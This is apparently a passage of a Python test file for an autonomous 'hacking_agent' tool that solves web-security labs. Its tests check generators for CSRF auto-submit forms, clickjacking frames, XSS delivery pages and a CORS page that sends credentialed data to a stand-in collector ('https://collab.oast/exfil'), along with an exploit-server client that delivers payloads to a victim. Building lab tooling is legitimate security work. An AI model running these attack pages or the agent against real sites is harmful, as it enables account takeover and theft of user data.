        # Cookie is planted by the img load, and submit fires from its onload.
        self.assertIn("onload=", body)
        self.assertNotIn("onerror", body)
        # Submit must happen exactly once, driven by the cookie-setter onload.
        self.assertEqual(body.count(".submit()"), 1)
        img_idx = body.index("<img")
        submit_idx = body.index(".submit()")
        self.assertLess(img_idx, submit_idx)
        # Both the form token and cookie-setter URL are present.
        self.assertIn("FORGED", body)
        self.assertIn("https://lab/?search=inject", body)
        self.assertEqual(page.head, p.DEFAULT_HTML_HEAD)

    def test_autosubmit_form_has_form_and_script_submit(self):
        from hacking_agent.core import exploit_primitives as p

        page = p.csrf_autosubmit_form(
            "https://lab/email", {"email": "x@evil.net", "csrf": "T"},
        )
        self.assertIn(f'id="{p.FORM_ID}"', page.body)
        self.assertIn(".submit()", page.body)
        self.assertIn('name="email"', page.body)

    def test_clickjacking_frame_has_opacity_overlay_iframe(self):
        from hacking_agent.core import exploit_primitives as p

        page = p.clickjacking_frame("https://lab/my-account", decoy_text="Win a prize")
        self.assertIn("opacity", page.body)
        self.assertIn("<iframe", page.body)
        self.assertIn("https://lab/my-account", page.body)
        self.assertIn("Win a prize", page.body)

    def test_cors_exfil_page_uses_credentialed_fetch_and_beacon(self):
        from hacking_agent.core import exploit_primitives as p

        page = p.cors_exfil_page(
            "https://lab/api/key", "https://collab.oast/exfil",
        )
        self.assertIn("withCredentials = true", page.body)
        self.assertIn("https://lab/api/key", page.body)
        self.assertIn("https://collab.oast/exfil", page.body)

    def test_xss_dom_mode_uses_iframe(self):
        from hacking_agent.core import exploit_primitives as p

        reflected = p.xss_delivery_page("https://lab/?q=<script>", mode="reflected")
        self.assertIn("location", reflected.body)
        dom = p.xss_delivery_page("https://lab/#x", mode="dom")
        self.assertIn("<iframe", dom.body)


# =============================================================================
# imp-exploitsrv: exploit-server discovery + field parsing (mocked HTTP)
# =============================================================================

class ExploitServerTests(unittest.TestCase):
    def test_discovers_url_from_exploit_link(self):
        from hacking_agent.core.exploit_server import discover_exploit_server_url

        html = (
            '<a id="exploit-link" href="https://exploit-abc.exploit-server.net/">'
            "Go to exploit server</a>"
        )
        url = discover_exploit_server_url("https://lab", lab_html=html)
        self.assertEqual(url, "https://exploit-abc.exploit-server.net")

    def test_field_discovery_reads_custom_names_with_fallback(self):
        from hacking_agent.core.exploit_server import ExploitServer

        default_page = (
            '<form><input name="responseHead"><textarea name="responseBody">'
            '</textarea><input name="responseFile"><input name="urlIsHttps">'
            '<input name="formAction"></form>'
        )

        def http_get(url, follow_redirects=True):
            return default_page

        posts = []

        def http_post(url, data, headers=None):
            posts.append((url, data))
            return "HTTP/1.1 200 OK\n\nstored"

        server = ExploitServer("https://exploit-abc.exploit-server.net",
                               http_get=http_get, http_post=http_post)
        fields = server.form_fields()
        self.assertEqual(fields.head, "responseHead")
        self.assertEqual(fields.action, "formAction")

        self.assertTrue(server.store("HEAD", "BODY", path="/exploit", https=True))
        self.assertTrue(posts)
        _, data = posts[0]
        self.assertIn("formAction=STORE", data)
        self.assertIn("responseBody=BODY", data)
        self.assertIn("urlIsHttps=on", data)

    def test_deliver_reuses_last_store_fields(self):
        from hacking_agent.core.exploit_server import ExploitServer

        posts = []

        def http_get(url, follow_redirects=True):
            return None  # force fallback field names

        def http_post(url, data, headers=None):
            posts.append(data)
            return "HTTP/1.1 302 Found\n\n"

        server = ExploitServer("https://exploit-abc.exploit-server.net",
                               http_get=http_get, http_post=http_post)
        self.assertTrue(server.store("HEAD", "BODY"))
        self.assertTrue(server.deliver_to_victim())
        self.assertIn("formAction=STORE", posts[0])
        self.assertIn("formAction=DELIVER_TO_VICTIM", posts[1])

    def test_is_lab_solved_detects_banner(self):
        from hacking_agent.core.exploit_server import is_lab_solved

        self.assertTrue(is_lab_solved("<div class='is-solved'>"))
        self.assertTrue(is_lab_solved("Congratulations, you solved the lab"))
        self.assertFalse(is_lab_solved("not yet"))


# =============================================================================
# imp-loop: durable boost/demote folds into deterministic tool ranking
# =============================================================================

class ToolSelectorDurableTests(unittest.TestCase):
    def test_boost_and_demote_shift_tool_scores(self):
        from hacking_agent.core.tool_selector import rank_tools

        available = ["sqlmap", "nuclei_scan", "http_request"]
        base = {r["tool"]: r["score"]
                for r in rank_tools("sqli", "exploit", available_tools=available)}
        boosted = {r["tool"]: r["score"] for r in rank_tools(
            "sqli", "exploit", available_tools=available,
            boost_tools=["nuclei_scan"], demote_tools=["sqlmap"],
        )}
        if "nuclei_scan" in base and "nuclei_scan" in boosted:
            self.assertGreater(boosted["nuclei_scan"], base["nuclei_scan"])
        if "sqlmap" in base and "sqlmap" in boosted:
            self.assertLess(boosted["sqlmap"], base["sqlmap"])


if __name__ == "__main__":
    unittest.main()
